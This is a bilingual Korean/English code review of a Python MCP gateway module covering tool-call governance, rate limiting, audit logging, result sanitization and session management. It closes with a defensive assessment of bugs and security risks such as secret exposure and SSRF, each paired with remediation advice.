async def call_tool(server_id: str, ctx: RpcContext, name: str, arguments: dict) -> dict:
    mode, refs, limits = await run_in_threadpool(_load_targets, server_id, ctx.principal)
    srv, tool = _resolve_tool(mode, refs, name)
    if limits and limits.get(srv.id) and tool not in limits[srv.id]:
        raise RpcError(FORBIDDEN, f"가상 서버 {server_id} 에 포함되지 않은 도구: {name}", {"code": "tool_not_in_virtual"})
    if not srv.tools:
        await _tools_of(srv)  # 인자 스키마 검증용

    def _check():
        with SessionLocal() as db:
            d = governance.check_tool(db, ctx.principal, srv.id, tool, arguments, agent=ctx.agent,
                                      data_class=ctx.data_class, approval_id=ctx.approval_id,
                                      session_id=ctx.session_id, run_id=ctx.run_id, step_id=ctx.step_id)
            ap = d.approval
            # FR-G04 도구 단위 한도 — 허용된 호출만 버킷 차감 (target = "<서버>.<도구>", 패턴 예: "jira.*")
            lim = ratelimit.check(db, ctx.principal, "tool", f"{srv.id}.{tool}", ctx.agent) if d.allow else None
            return d, ({"approval_id": ap.id, "approver": ap.approver, "expires_at": ap.expires_at.isoformat()}
                       if ap is not None and d.code == "approval_required" else None), lim
    dec, ap_info, lim = await run_in_threadpool(_check)
    qualified = f"{srv.id}.{tool}"
    if lim is not None and not lim.allowed:
        metrics.POLICY_DENIES.labels("tool", "rate_limited").inc()
        await run_in_threadpool(lambda: audit.append(
            "gateway.tool.limit", actor=ctx.principal.sub, actor_kind=ctx.principal.kind, target=qualified,
            decision="rate_limited", data={"reason": lim.reason, "limit_id": lim.limit_id, "agent": ctx.agent}))
        raise RpcError(RATE_LIMITED, lim.reason or "한도 초과",
                       {"code": "rate_limited", "retry_after": lim.retry_after, "limit_id": lim.limit_id}, http_status=429)
    with span(f"mcp tools/call {qualified}", SpanKind.CLIENT, **{
            "gen_ai.operation.name": "execute_tool", "gen_ai.tool.name": qualified, "mcp.method.name": "tools/call",
            "mcp.server": srv.id, "anx.decision": dec.code, "anx.risk": dec.risk, "anx.agent": ctx.agent}):
        return await _call_tool_inner(srv, ctx, tool, qualified, arguments, dec, ap_info, mode, server_id)
```
**분석 / Analysis (Level 2)**
- L870-876: 대상 해석·가상 서버 도구 제한.
- L878-888 `_check`(스레드풀): `governance.check_tool`(허용목록→프로파일→정책→인자 스키마→승인) + 허용된 호출만 도구 한도 차감.
- L889-896: 한도 초과면 메트릭·감사 후 429(-32005, `Retry-After`).
- L897-900: GenAI 시맨틱 컨벤션 속성으로 CLIENT 스팬을 열고 실제 호출.
**짚어볼 점 / Watch-outs**
- L875-876 `if not srv.tools: await _tools_of(srv)` 의 반환값을 쓰지 않는다 — `srv.tools` 는 여전히 비어 있다. 주석("인자 스키마 검증용")과 달리 실제 검증은 `governance.check_tool` 이 DB 의 `srv.tools` 를 다시 읽어서 한다(`app/services/governance.py:134`). 즉 이 호출의 효과는 "DB 갱신" 뿐이다 — 의도를 주석으로 명확히.

```python path=app/services/mcp_gateway.py lines=903-938
async def _call_tool_inner(srv, ctx, tool, qualified, arguments, dec, ap_info, mode, server_id) -> dict:
    if not dec.allow:
        if dec.code == "approval_required":
            raise RpcError(APPROVAL_REQUIRED, dec.reason, {"code": dec.code, "risk": dec.risk, "tool": qualified,
                                                           **(ap_info or {})})
        metrics.POLICY_DENIES.labels("tool", dec.code).inc()
        logs.event("warning", "gateway", f"도구 호출 거부: {qualified}", code=dec.code, reason=dec.reason,
                   agent=ctx.agent)
        await run_in_threadpool(lambda: audit.append(
            "gateway.tool.deny", actor=ctx.principal.sub, actor_kind=ctx.principal.kind, target=qualified,
            decision=dec.code, data={"reason": dec.reason, "agent": ctx.agent}))
        raise RpcError(FORBIDDEN, dec.reason, {"code": dec.code, "tool": qualified, "risk": dec.risk})
    t0 = time.perf_counter()
    status = "ok"
    try:
        result = await call_server(srv, ctx.principal, "tools/call", {"name": tool, "arguments": arguments}, ctx)
        if result.get("isError"):
            status = "tool_error"
    except RpcError:
        status = "error"
        raise
    finally:
        ms = int((time.perf_counter() - t0) * 1000)
        metrics.TOOL_CALLS.labels(srv.id, tool, status).inc()
        await run_in_threadpool(_record_tool, ctx, qualified, srv.id, ms, status, dec, mode, server_id)

    def _sanitize():
        with SessionLocal() as db:
            return guards.sanitize_tool_result(db, result) if dec.sanitize else (result, [])
    clean, findings = await run_in_threadpool(_sanitize)
    if dec.risk == "high" or findings:
        await run_in_threadpool(lambda: audit.append(
            "gateway.tool.call", actor=ctx.principal.sub, actor_kind=ctx.principal.kind, target=qualified,
            decision="allow", data={"risk": dec.risk, "approval": dec.approval.id if dec.approval else None,
                                    "sanitized": [f.as_dict() for f in findings], "agent": ctx.agent}))
    return clean
```
**분석 / Analysis (Level 2)**
- L904-914: 거부 — 승인 필요면 -32001 + approval_id(클라이언트가 승인 후 `X-AgentNexus-Approval` 로 재호출), 그 외 거부는 메트릭·이벤트 로그·감사 후 -32003.
- L915-927: 업스트림 호출 + 지연·상태 기록(`finally` — 실패해도 사용량 기록).
- L929-938: 결과 소독(지시문 제거·PII 마스킹·소독 규칙), 고위험이거나 소독 발견이 있으면 감사.
**짚어볼 점 / Watch-outs**
- [위험:낮음 · 버그] L916-923 `status` 는 `RpcError` 일 때만 `"error"` 가 된다. stdio·hosted 경로의 일반 예외(`RuntimeError`·`httpx` 오류·`ValueError` 등)는 `except` 에 걸리지 않아 **`status="ok"` 로 사용량·메트릭이 기록된 뒤** 예외가 전파된다. `except Exception: status = "error"; raise` 로 바꿔야 한다.
- L932 소독을 끈 규칙(`sanitize=False`)이면 간접 프롬프트 인젝션 방어가 꺼진다 — 규칙 편집 권한(`policy:write`)을 가진 사람만 바꿀 수 있다.

```python path=app/services/mcp_gateway.py lines=941-951
def _record_tool(ctx: RpcContext, qualified: str, srv_id: str, ms: int, status: str, dec, mode: str, requested: str):
    with SessionLocal() as db:
        db.add(UsageRecord(id=new_id("use"), trace_id=current_trace_id(), session_id=ctx.session_id,
                           run_id=ctx.run_id, step_id=ctx.step_id, user_sub=ctx.principal.sub, team=ctx.principal.team, agent=ctx.agent,
                           kind="tool", target=qualified, provider=srv_id, latency_ms=ms, status=status,
                           policy_decisions=[{"code": dec.code, "risk": dec.risk, "policy": dec.policy.get("policy_id")}]))
        if mode != "single":
            db.add(RoutingDecision(id=new_id("rd"), trace_id=current_trace_id(), kind="mcp", subject=ctx.principal.sub,
                                   requested=f"{requested}:{qualified}", chosen=srv_id, candidates=[srv_id],
                                   reason=f"{mode} 서버 네임스페이스 라우팅", status=status))
        db.commit()
```
**분석 / Analysis (Level 2)**
- L941-951 `_record_tool`: 사용량 행(도구 호출은 토큰·비용 0) + 집계·가상 모드면 라우팅 결정 로그. 한 트랜잭션으로 커밋.

```python path=app/services/mcp_gateway.py lines=954-992
async def generic(server_id: str, ctx: RpcContext, method: str, params: dict | None) -> dict:
    """resources/* · prompts/* · ping — 집계 대상이면 서버별로 합치거나 순서대로 시도."""
    mode, refs, _ = await run_in_threadpool(_load_targets, server_id, ctx.principal)
    if method in ("resources/list", "resources/templates/list", "prompts/list"):
        key = {"resources/list": "resources", "resources/templates/list": "resourceTemplates",
               "prompts/list": "prompts"}[method]
        items = []
        for srv in refs:
            try:
                res = await call_server(srv, ctx.principal, method, params)
            except RpcError:
                if mode == "single":
                    raise
                continue
            for it in res.get(key, []):
                it = {**it, "_meta": {**(it.get("_meta") or {}), "io.agentnexus/server": srv.id}}
                if mode != "single" and key == "prompts":
                    it["name"] = f"{srv.id}.{it['name']}"
                items.append(it)
        return {key: items}
    if method == "prompts/get" and mode != "single":
        srv, name = _resolve_tool(mode, refs, (params or {}).get("name", ""))
        return await call_server(srv, ctx.principal, method, {**(params or {}), "name": name}, ctx)
    last: RpcError | None = None
    for srv in refs:
        try:
            res = await call_server(srv, ctx.principal, method, params, ctx)
            if method == "resources/read":
                def _san():
                    with SessionLocal() as db:
                        for c in res.get("contents", []):
                            if "text" in c:
                                c["text"] = guards.sanitize_tool_text(db, c["text"]).text
                        return res
                res = await run_in_threadpool(_san)
            return res
        except RpcError as exc:
            last = exc
    raise last or RpcError(NOT_FOUND, "대상 서버 없음")
```
**분석 / Analysis (Level 2)**
- L954-973: 목록 메서드는 서버별 결과를 합치고 서버 메타를 붙인다(집계 모드 프롬프트는 이름 접두).
- L974-976: 집계 `prompts/get` 은 이름으로 서버 선택.
- L977-992: 그 외(`resources/read`·`ping` 등)는 대상 서버를 순서대로 시도해 첫 성공을 반환, `resources/read` 텍스트는 소독.
**짚어볼 점 / Watch-outs**
- [위험:낮음] L978-990 집계(`_all`) `resources/read` 는 URI 를 **모든 서버에 차례로** 보낸다 — 어떤 서버의 리소스 URI(내부 식별자 포함)가 다른 서버들에도 전달된다(정보 노출). URI 스킴으로 서버를 고르는 편이 맞다.
- L982-987 `_san` 이 `res` 를 제자리 변경 — 함수가 즉시 호출되므로 클로저 late-binding 문제는 없다.

```python path=app/services/mcp_gateway.py lines=995-1041
# ───────────────────────── 클라이언트 세션 ─────────────────────────
def negotiate(requested: str | None) -> str:
    return requested if requested in MCP_SUPPORTED_VERSIONS else MCP_PROTOCOL_VERSION


def open_session(server_id: str, p: Principal, params: dict) -> tuple[str, dict]:
    version = negotiate(params.get("protocolVersion"))
    sid = token_urlsafe(24)
    with SessionLocal() as db:
        db.add(McpSession(id=sid, kind="client", server_id=server_id, principal_sub=p.sub, protocol_version=version,
                          client_info={**(params.get("clientInfo") or {}),
                                       "_capabilities": params.get("capabilities") or {}},
                          events=[{"type": "opened", "at": utcnow().isoformat(), "protocol": version}]))
        db.commit()
    result = {"protocolVersion": version,
              "capabilities": {"tools": {"listChanged": False}, "resources": {"listChanged": False},
                               "prompts": {"listChanged": False}, "logging": {}},
              "serverInfo": {**GATEWAY_INFO, "name": f"agentnexus-gateway/{server_id}"},
              "instructions": "AgentNexus AI Gateway — 정책·승인·감사가 적용된 MCP 프록시입니다."}
    return sid, result


def check_session(sid: str, server_id: str, p: Principal) -> bool:
    with SessionLocal() as db:
        s = db.get(McpSession, sid)
        if s is None or s.kind != "client" or s.closed_at or s.server_id != server_id or s.principal_sub != p.sub:
            return False
        s.last_used_at = utcnow()
        db.commit()
        return True


def session_capabilities(sid: str) -> dict:
    with SessionLocal() as db:
        s = db.get(McpSession, sid)
        return ((s.client_info or {}).get("_capabilities") or {}) if s else {}


def close_session(sid: str, p: Principal) -> bool:
    with SessionLocal() as db:
        s = db.get(McpSession, sid)
        if s is None or s.principal_sub != p.sub:
            return False
        s.closed_at = utcnow()
        s.events = (s.events or [])[-19:] + [{"type": "closed", "at": utcnow().isoformat(), "by": "client"}]
        db.commit()
        return True
```
**분석 / Analysis (Level 2)**
- L996-997 `negotiate`: 지원 버전이면 그대로, 아니면 최신(2025-11-25).
- L1000-1014 `open_session`: 192비트 무작위 세션 id(`token_urlsafe(24)`), 클라이언트 능력·이벤트 기록, initialize 결과(능력·서버 정보·안내문).
- L1017-1024 `check_session`: 세션이 클라이언트용·미종료·같은 서버·**같은 주체**인지 확인(다른 사용자의 세션 id 재사용 차단 — `test/test_mcp.py:93-94`).
- L1027-1030: 세션 능력 조회. L1033-1041 `close_session`: 주체 확인 후 종료, 최근 이벤트 20개 유지.
**짚어볼 점 / Watch-outs**
- L1022-1023 세션 확인마다 `last_used_at` 쓰기·커밋 — 요청당 DB 쓰기 1회.
- L1036 `close_session` 은 `server_id` 를 확인하지 않는다 — 같은 주체의 다른 서버 세션도 이 경로로 닫힌다(영향 낮음).

## 파일 평가 / File Assessment
- 강점: (1) 기본 거부 도구 노출·도구별 최소 스코프 교환·승인 인자 해시 바인딩 등 게이트웨이 통제가 한 경로에 모여 있다. (2) 비동기 구간과 동기 DB 를 `run_in_threadpool` 로 일관되게 분리, `ServerRef` 스냅샷으로 세션 경계를 지킨다. (3) legacy/modern(MRTR)·hosted·stdio 를 같은 정책 경로로 통합.
- 위험: (1) [높음] 사용자 병합 가능한 `auth.secret_ref`·`endpoint` 로 임의 시크릿 외부 전송(L124-155, L690-767). (2) [높음] 업스트림 메타데이터로 발견한 외부 AS 에 사용자 원본 토큰 전송(L158-180) + 업스트림 지정 URL 조회(블라인드 SSRF, L200-234). (3) [중간] stdio 허용 목록이 실행 파일 이름만 검사, [낮음] 일반 예외 시 사용량 `ok` 기록·캐시 경쟁.
- 개선 권고(영향순): (1) `secret_ref` 네임스페이스 고정 + endpoint 변경 재승인 + 외부 AS 허용 목록·원본 토큰 미전송. (2) 업스트림 지정 URL 은 등록 시 고정하고 사설 대역 차단 옵션 적용. (3) `except Exception` 상태 기록, single-flight 도구 갱신, stdio 명령 전체 허용 목록.
- 재읽기 권고 레벨: 2 — 신뢰 경계(사용자→게이트웨이→업스트림)가 교차하는 핵심 파일이다.
